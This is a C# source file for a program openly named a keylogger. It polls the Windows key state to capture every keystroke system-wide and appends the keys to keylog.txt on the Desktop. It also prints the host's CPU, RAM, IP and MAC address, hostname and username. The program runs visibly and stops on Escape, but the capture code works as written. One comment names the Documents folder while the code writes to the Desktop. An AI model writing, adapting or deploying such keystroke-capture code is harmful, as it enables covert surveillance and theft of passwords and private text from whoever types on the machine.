using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger
{
    // --- EventArgs class for key press events ---
    public class KeyPressedEventArgs : EventArgs
    {
        public char Key { get; }
        public string KeyName { get; }
        public DateTime PressedAt { get; }

        public KeyPressedEventArgs(char key, string keyName)
        {
            Key = key;
            KeyName = keyName;
            PressedAt = DateTime.Now;
        }
    }

    // --- Listens for keyboard input and fires events ---
    public class KeyboardListener
    {
        [DllImport("User32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        // Tracks currently held keys to avoid duplicate triggers
        private readonly HashSet<int> _pressedKeys = new HashSet<int>();
        private bool _isRunning = false;

        public event EventHandler<KeyPressedEventArgs>? KeyPressed;

        // Maps key codes to human-readable names
        private string GetKeyName(int keyCode)
        {
            return keyCode switch
            {
                8 => "[Backspace]",
                9 => "[Tab]",
                13 => "[Enter]",
                16 => "[Shift]",
                17 => "[Ctrl]",
                18 => "[Alt]",
                20 => "[CapsLock]",
                27 => "[Escape]",
                32 => "[Space]",
                37 => "[←]",
                38 => "[↑]",
                39 => "[→]",
                40 => "[↓]",
                46 => "[Delete]",
                _ => ((char)keyCode).ToString()
            };
        }

        public void Start()
        {
            _isRunning = true;
            Console.WriteLine("Listening started. Press Escape to exit.\n");

            while (_isRunning)
            {
                Thread.Sleep(50);

                for (int i = 8; i < 180; i++)
                {
                    int state = GetAsyncKeyState(i);

                    // Check the high-order bit to detect if the key is currently held down
                    bool isPressed = (state & 0x8000) != 0;

                    if (isPressed && !_pressedKeys.Contains(i))
                    {
                        _pressedKeys.Add(i);

                        // Stop the listener when Escape is pressed
                        if (i == 27)
                        {
                            _isRunning = false;
                            break;
                        }

                        string keyName = GetKeyName(i);
                        char keyChar = (char)i;
                        KeyPressed?.Invoke(this, new KeyPressedEventArgs(keyChar, keyName));
                    }
                    else if (!isPressed && _pressedKeys.Contains(i))
                    {
                        // Remove the key once it is released
                        _pressedKeys.Remove(i);
                    }
                }
            }

            Console.WriteLine("\nListening stopped.");
        }

        public void Stop() => _isRunning = false;
    }

    // --- Displays pressed keys to the console with color ---
    public class ConsoleDisplay
    {
        public void OnKeyPressed(object? sender, KeyPressedEventArgs e)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write($"[{e.KeyName}] ");
            Console.ResetColor();
        }
    }

    // --- Logs pressed keys to a file ---
    public class FileLogger : IDisposable
    {
        private readonly StreamWriter _writer;

        public FileLogger(string path)
        {
            _writer = new StreamWriter(path, append: true);
            // Flush after every write so no data is lost on crash
            _writer.AutoFlush = true;
        }

        public void OnKeyPressed(object? sender, KeyPressedEventArgs e)
        {
            _writer.Write($"{e.KeyName}");
        }

        public void Dispose() => _writer?.Dispose();
    }

    // --- Collects and displays system information ---
    public class SystemInfo
    {
        // Returns CPU name from the registry (Windows only)
        public string GetCpuName()
        {
            string cpu = "Unknown";
            try
            {
#pragma warning disable CA1416
                using var key = Microsoft.Win32.Registry.LocalMachine
                    .OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
                cpu = key?.GetValue("ProcessorNameString")?.ToString()?.Trim() ?? "Unknown";
#pragma warning restore CA1416
            }
            catch { /* Registry access failed */ }
            return cpu;
        }

        // Returns total installed RAM in megabytes via WMI
        public long GetTotalRamMb()
        {
            long totalMb = 0;
            try
            {
                using var searcher = new System.Management.ManagementObjectSearcher(
                    "SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
                foreach (System.Management.ManagementObject obj in searcher.Get())
                    totalMb = Convert.ToInt64(obj["TotalVisibleMemorySize"]) / 1024;
            }
            catch { /* WMI query failed */ }
            return totalMb;
        }

        // Returns current available RAM in megabytes via WMI
        public long GetAvailableRamMb()
        {
            long availMb = 0;
            try
            {
                using var searcher = new System.Management.ManagementObjectSearcher(
                    "SELECT FreePhysicalMemory FROM Win32_OperatingSystem");
                foreach (System.Management.ManagementObject obj in searcher.Get())
                    availMb = Convert.ToInt64(obj["FreePhysicalMemory"]) / 1024;
            }
            catch { /* WMI query failed */ }
            return availMb;
        }

        // Returns the local machine hostname
        public string GetHostname() => Dns.GetHostName();

        // Returns the first active IPv4 address found on the machine
        public string GetLocalIp()
        {
            try
            {
                foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus != OperationalStatus.Up) continue;
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;

                    foreach (var addr in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                            return addr.Address.ToString();
                    }
                }
            }
            catch { /* Network enumeration failed */ }
            return "Unavailable";
        }

        // Returns the MAC address of the first active non-loopback interface
        public string GetMacAddress()
        {
            try
            {
                foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus != OperationalStatus.Up) continue;
                    if (ni.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;
                    return ni.GetPhysicalAddress().ToString();
                }
            }
            catch { /* Network enumeration failed */ }
            return "Unavailable";
        }

        // Prints all collected system information to the console
        public void Print()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("=== System Information ===");
            Console.ResetColor();

            // CPU & RAM
            Console.WriteLine($"  CPU         : {GetCpuName()}");
            long total = GetTotalRamMb();
            long avail = GetAvailableRamMb();
            Console.WriteLine($"  Total RAM   : {total} MB");
            Console.WriteLine($"  Free RAM    : {avail} MB  (Used: {total - avail} MB)");

            // Network
            Console.WriteLine($"  Hostname    : {GetHostname()}");
            Console.WriteLine($"  Local IP    : {GetLocalIp()}");
            Console.WriteLine($"  MAC Address : {GetMacAddress()}");

            // Operating system
            Console.WriteLine($"  OS          : {RuntimeInformation.OSDescription}");
            Console.WriteLine($"  Architecture: {RuntimeInformation.OSArchitecture}");
            Console.WriteLine($"  Machine     : {Environment.MachineName}");
            Console.WriteLine($"  Username    : {Environment.UserName}");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("==========================\n");
            Console.ResetColor();
        }
    }

    // --- Entry point ---
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Keylogger";
            Console.WriteLine("=== Keylogger ===");
           

            // Print system information at startup
            new SystemInfo().Print();

            // Set output file path inside the Documents folder
            string folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string path = Path.Combine(folder, "keylog.txt");

            // Create instances
            var listener = new KeyboardListener();
            var display = new ConsoleDisplay();

            using var fileLogger = new FileLogger(path);

            // Subscribe handlers to the KeyPressed event
            listener.KeyPressed += display.OnKeyPressed;
            listener.KeyPressed += fileLogger.OnKeyPressed;

            // Start listening
            listener.Start();
        }
    }
}